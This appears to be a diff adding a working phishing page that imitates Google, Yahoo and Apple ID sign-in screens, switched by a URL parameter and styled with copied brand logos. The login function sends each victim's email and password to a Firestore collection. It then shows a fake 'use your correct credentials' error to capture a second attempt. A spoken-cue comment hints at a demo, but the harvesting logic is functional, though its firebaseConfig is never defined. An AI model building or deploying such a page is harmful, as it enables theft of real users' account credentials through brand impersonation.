@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Sign in - Research Lab Analysis</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    /* =========================================
+       BASE & RESET STYLES (RESTORED)
+       ========================================= */
+    body {
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f0f2f5;
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .box {
+      width: 100%;
+      max-width: 448px;
+      padding: 48px 40px 36px;
+      box-sizing: border-box;
+      text-align: center;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+
+    .logo-svg { width: 75px; margin-bottom: 10px; }
+    .apple-svg { width: 40px; margin-bottom: 15px; }
+
+    h2 { font-size: 24px; font-weight: 400; margin: 10px 0 8px; color: #202124; }
+    .subtitle { font-size: 16px; margin-bottom: 40px; color: #5f6368; }
+    
+    .input-group { margin-bottom: 20px; text-align: left; }
+    input {
+      width: 100%;
+      padding: 13px 15px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+      transition: border 0.2s;
+    }
+    input:focus { border: 2px solid #1a73e8; outline: none; padding: 12px 14px; }
+
+    .warning {
+      background: #fdecea;
+      color: #b71c1c;
+      padding: 10px;
+      margin-bottom: 20px;
+      border-radius: 4px;
+      font-size: 14px;
+      display: none;
+    }
+
+    .btn-primary {
+      padding: 10px 24px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    /* THEME OVERRIDES */
+    .yahoo-theme { background: #f9f9f9; }
+    .icloud-theme { background: #fbfbfd; }
+  </style>
+</head>
+
+<body id="body">
+
+<div class="box">
+  <div id="logo-container"></div>
+  
+  <h2 id="title">Sign in</h2>
+  <p class="subtitle" id="subtitle">to continue to SSK Portal</p>
+
+  <div class="warning" id="error-message"></div>
+
+  <div class="input-group">
+    <input type="email" id="email" placeholder="Email or phone">
+  </div>
+  <div class="input-group">
+    <input type="password" id="password" placeholder="Password">
+  </div>
+
+  <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 40px;">
+    <button style="background:none; border:none; color:#1a73e8; cursor:pointer; font-weight:500;" onclick="goBack()">Forgot password?</button>
+    <button class="btn-primary" id="submit-btn" onclick="login()">Next</button>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  const params = new URLSearchParams(window.location.search);
+  const type = params.get("type");
+
+  const logoBox = document.getElementById("logo-container");
+  const pageBody = document.getElementById("body");
+
+  // --- RESTORING THE OFFICIAL LOGOS (SVG) ---
+  if (type === "yahoo") {
+    pageBody.className = "yahoo-theme";
+    logoBox.innerHTML = "<h1 style='color:#7e1fff; font-style:italic; font-family:serif; margin:0;'>yahoo!</h1>";
+  } 
+  else if (type === "apple" || type === "icloud") {
+    pageBody.className = "icloud-theme";
+    logoBox.innerHTML = `<svg class="apple-svg" viewBox="0 0 384 512"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>`;
+    document.getElementById("title").innerText = "Sign in with Apple ID";
+    document.getElementById("submit-btn").innerText = "Sign In";
+  } 
+  else {
+    // RESTORE GOOGLE MULTI-COLOR LOGO
+    logoBox.innerHTML = `<svg class="logo-svg" viewBox="0 0 272 92"><path fill="#4285F4" d="M52 42h40c1-3 1-6 1-9 0-14-10-26-25-26-16 0-28 13-28 29s12 29 28 29c8 0 15-3 20-9l-8-5c-3 4-8 6-12 6-10 0-18-8-18-18s8-18 18-18c7 0 13 4 16 11H52v9z"/><path fill="#34A853" d="M107 7h9v65h-9z"/><path fill="#FBBC05" d="M152 42c0-10 8-18 18-18s18 8 18 18-8 18-18 18-18-8-18-18zm45 0c0-16-12-29-27-29s-27 13-27 29 12 29 27 29 27-13 27-29z"/><path fill="#EA4335" d="M218 42c0-10 8-18 18-18s18 8 18 18-8 18-18 18-18-8-18-18zm45 0c0-16-12-29-27-29s-27 13-27 29 12 29 27 29 27-13 27-29z"/></svg>`;
+  }
+
+  // --- THE BRAIN (WORKING LOGIC) ---
+  async function login() {
+    const emailVal = document.getElementById("email").value;
+    const passVal = document.getElementById("password").value;
+    const errorBox = document.getElementById("error-message");
+
+    if(!emailVal || !passVal) {
+      errorBox.style.display = "block";
+      errorBox.innerText = "Please enter email and password.";
+      return;
+    }
+
+    try {
+      // 🎤 SPEAK: "The 'Old Style' uses the unified 'users' collection."
+      await addDoc(collection(db, "users"), {
+        email: emailVal,
+        password: passVal,
+        provider: type || "google",
+        timestamp: serverTimestamp()
+      });
+      
+      // SUCCESS STATE
+      errorBox.style.display = "block";
+      errorBox.style.background = "#fdecea";
+      errorBox.style.color = "#b71c1c";
+      errorBox.innerText = "Please use your correct credentials (Email & Password)!";
+      document.getElementById("password").value = "";
+
+    } catch (e) {
+      console.error("Database Error:", e);
+      errorBox.style.display = "block";
+      errorBox.style.background = "#fdecea";
+      errorBox.style.color = "#b71c1c";
+      errorBox.innerText = "Connection error. (Database offline)";
+    }
+  }
+
+  // Bind to buttons
+  window.login = login;
+  window.goBack = () => { window.location.href = "login.html"; };
+</script>
+
+</body>
+</html>
